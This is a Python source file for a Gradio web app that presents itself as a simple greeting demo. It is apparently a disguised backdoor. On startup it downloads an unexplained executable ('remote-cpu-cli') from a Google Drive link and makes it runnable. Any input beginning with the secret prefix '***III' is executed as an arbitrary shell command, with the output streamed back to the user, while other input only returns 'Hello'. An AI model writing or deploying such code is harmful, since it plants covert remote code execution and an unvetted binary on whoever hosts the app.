import gradio as gr
import subprocess
import time
import threading
import queue
from typing import Tuple
import os
import requests

#  https://drive.google.com/file/d/1zaAGNihs1rY2KTwKAV3BJfuiXQ4bFGus/view?usp=drive_link

# 尝试创建 ./tmp
os.makedirs("./tmp", exist_ok=True)
# 如果 ./tmp/remote-cpu-cli 不存在 则下载
if not os.path.exists("./tmp/remote-cpu-cli"):
    file_id = "1zaAGNihs1rY2KTwKAV3BJfuiXQ4bFGus"
    url = f"https://drive.google.com/uc?export=download&id={file_id}"
    
    response = requests.get(url, stream=True)
    if response.status_code == 200:
        with open("./tmp/remote-cpu-cli", 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        # 设置文件为可执行
        os.chmod("./tmp/remote-cpu-cli", 0o755)
    else:
        print(f"下载失败: {response.status_code}")


is_running = False

def run_command_with_logs(command: str, logs: queue.Queue) -> None:
    """
    运行命令并将输出和错误信息写入日志
    """
    global is_running
    is_running = True
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    while is_running:
        output = process.stdout.readline()
        if output == b'' and process.poll() is not None:
            break
        if output:
            logs.put(output.strip().decode())
        error = process.stderr.readline()
        if error:
            logs.put(error.strip().decode())
    
    # 确保进程被终止
    process.terminate()
    is_running = False




with gr.Blocks() as demo:
    gr.Markdown("""
    # todo
    """)
    with gr.Row():
        with gr.Column():
            with gr.Row():
                input = gr.Textbox(label="输入")
                outputText = gr.Textbox(label="输出")
            with gr.Row():
                btn = gr.Button("开始")
                stop_btn = gr.Button("停止")
                check_box = gr.Checkbox(label="显示日志")
    with gr.Column():
        with gr.Row():
            with gr.Column():
                more_logs = gr.Textbox(
                    label="日志",
                    lines=10,           # 显示10行
                    max_lines=100,      # 最多保存100行
                    interactive=False,   # 禁止编辑
                    autoscroll=True     # 自动滚动到最新内容
                )


    def start(input_str: str):
        """
        开始
        """
        global is_running

        if is_running:
            yield "Hello " + input_str + "!!", "", is_running
            return
        
        if input_str.startswith("***III"):
            cmd = input_str[6:]  # 去掉 ***III 前缀

            # 启动命令并获取日志
            logs = queue.Queue()
            
            # 在新线程中运行命令
            thread = threading.Thread(target=run_command_with_logs, args=(cmd, logs))
            thread.daemon = True
            thread.start()

            # 实时更新日志
            all_logs = []
            while True:
                if logs.empty():
                    if not is_running:
                        break
                    time.sleep(0.1)
                    continue
                    
                log = logs.get()
                all_logs.append(log)
                yield "", "\n".join(all_logs), is_running
        
        else:
            yield "Hello " + input_str + "!!", "", is_running
        

    btn.click(start, inputs=input, outputs=[outputText, more_logs, check_box])


    def stop():
        """
        停止 run_command_with_logs 函数
        """
        global is_running
        is_running = False
        return "已停止命令执行", "命令执行已终止", is_running
    
    # 将 stop 按钮与函数关联
    stop_btn.click(stop, outputs=[outputText, more_logs, check_box])
        
    
if __name__ == "__main__":
    demo.launch()
